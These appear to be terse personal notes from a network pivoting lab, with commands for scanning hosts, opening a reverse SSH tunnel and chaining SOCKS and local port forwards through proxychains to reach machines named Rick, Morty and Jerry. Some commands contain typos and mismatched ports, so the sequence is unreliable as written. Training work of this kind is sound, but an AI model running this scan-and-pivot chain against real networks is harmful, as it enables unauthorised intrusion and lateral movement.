### Idek anymore man.
```bash
IH$ nmap -sT -T4 10.50.87.199 -p 21-23,80
#Ports 23,80 seen open.
wget -r http://10.50.87.199
eog Rick-http*
IH$ telnet 10.50.87.199
Rick$ netstat -antlp
Rick$ ip a
Rick$ arp
# View open ports, see other networks
Rick$ ssh student@10.50.247.170 (THIS IS MY FLOAT IP) -R 1111:127.0.0.1:22 -NT
IH$ ssh Rick@127.0.0.1 -p 1111
#Tunnel is created, exit out of ssh back to IH$. NMAP is not enabled, we need a dynamic port forward
IH$ ssh Rick@127.0.0.1 -p 1111 -D 9050 -NT
#Split Vertically, create new box
IH$ proxychains nmap -sT -T4 10.1.2.18 -p 21-23,80 (Do the whole subnet)
#Most of the time, ./scan.sh will be quicker than NMAP
#View whats open, use wget and other things to enumerate
IH$ proxychains wget -r http://10.1.2.31
#It is listed that this is host morty and they have a SSH port open above well known
IH$ proxychains nmap
IH$ proxychains nc 10.1.2.18 2222
#This tells us 2222 is actually SSH on morty.
$IH ssh Rick@127.0.0.1 -p 21399 -L 21301:10.1.2.18(Morty IP):2222 -NT (2222 is the new ssh)
#Perform recon again
$IH  ssh Morty@127.0.0.1 -p 21399 -D 9050 -NT
#We need to get to Jerry
ssh Morty127.0.0.1 -P 21400 -L 21302:172.16.10.121:2323
ssh Jerry@127.0.0.1 -p 21302 -D 9050 -NT
IH$ ssh Jerry@127.0.0.1 -p 3333 -L 4444:192.168.10.69:22
